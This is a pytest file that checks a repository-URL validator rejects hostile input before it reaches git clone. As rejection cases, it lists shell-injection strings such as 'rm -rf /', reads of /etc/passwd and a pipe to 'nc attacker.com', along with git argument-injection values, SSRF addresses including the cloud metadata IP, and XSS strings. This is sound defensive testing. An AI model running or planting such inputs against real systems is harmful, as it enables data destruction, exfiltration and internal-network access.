"""Repository-URL sanitisation: hostile inputs never reach ``git clone``.

Ported from the URL cases of the old ``tests/integration/test_url_security.py``
(which targeted the removed ``is_valid_repo_url``) onto ``parse_repo_spec``,
the single validator used by the API, the legacy ingest route and the worker.
"""

import pytest

from app.codeintel.git_source import RepoSpecError, parse_repo_spec

HOSTS = ["github.com", "gitlab.com", "bitbucket.org"]


def _parse(spec):
    return parse_repo_spec(spec, allowed_hosts=HOSTS)


@pytest.mark.parametrize(
    "spec",
    [
        "github.com/user/repo",
        "https://github.com/user/repo",
        "https://github.com/user/repo.git",
        "gitlab.com/user/repo",
        "https://gitlab.com/group/sub/repo",
        "bitbucket.org/user/repo",
        "https://bitbucket.org/user/repo",
    ],
)
def test_valid_forge_urls_accepted(spec):
    assert _parse(spec).canonical_url.startswith("https://")


HOSTILE = {
    "empty": ["", "   ", "\t\n"],
    "shell metacharacters": [
        "github.com/user/repo; rm -rf /",
        "github.com/user/repo && cat /etc/passwd",
        "github.com/user/repo | nc attacker.com 1234",
        "github.com/user/repo`whoami`",
        "github.com/user/repo$(whoami)",
        "github.com/user/repo{echo,test}",
        "github.com/user/repo > /tmp/output",
        "github.com/user/repo < /etc/passwd",
    ],
    "path traversal": [
        "github.com/user/../../../etc/passwd",
        "github.com/user/repo/../../../",
        "github.com/../../etc/shadow",
        "https://gitlab.com/group/../../etc/passwd",
    ],
    "newlines": ["github.com/user/repo\nmalicious", "github.com/user/repo\r\nmalicious"],
    "other protocols": [
        "file:///etc/passwd",
        "FILE:///etc/passwd",
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "http://github.com/user/repo",
        "ssh://git@github.com/user/repo",
        "git://github.com/user/repo",
        "ext::sh -c touch% /tmp/pwned",
    ],
    "missing or malformed host": [
        "https://",
        "/user/repo",
        "https://-invalid.com/user/repo",
        "https://inv@lid.com/user/repo",
    ],
    "ssrf": [
        "https://169.254.169.254/latest/meta-data",
        "https://127.0.0.1/user/repo",
        "https://[::1]/user/repo",
        "https://localhost/user/repo",
        "https://github.com.evil.example/user/repo",
        "https://github.com:8443/user/repo",
    ],
    "credentials, query, fragment": [
        "https://token@github.com/user/repo",
        "https://user:pass@github.com/user/repo",
        "https://github.com/user/repo?x=1",
        "https://github.com/user/repo#frag",
    ],
    "argument injection": ["--upload-pack=touch /tmp/pwned", "-c core.sshCommand=x"],
    "too long": ["github.com/" + "a" * 3000],
}


@pytest.mark.parametrize(
    "spec", [pytest.param(s, id=f"{kind}:{i}") for kind, specs in HOSTILE.items() for i, s in enumerate(specs)]
)
def test_hostile_specs_rejected(spec):
    with pytest.raises(RepoSpecError):
        _parse(spec)


@pytest.mark.parametrize("code", [*range(0x00, 0x20), 0x7F])
def test_control_characters_rejected(code):
    with pytest.raises(RepoSpecError):
        _parse(f"github.com/user/repo{chr(code)}test")


def test_local_paths_rejected_outside_the_cli():
    for spec in ("/etc", "./repo", "../repo", "~/repo", "file:///srv/repo"):
        with pytest.raises(RepoSpecError, match="only be indexed from the CLI"):
            _parse(spec)
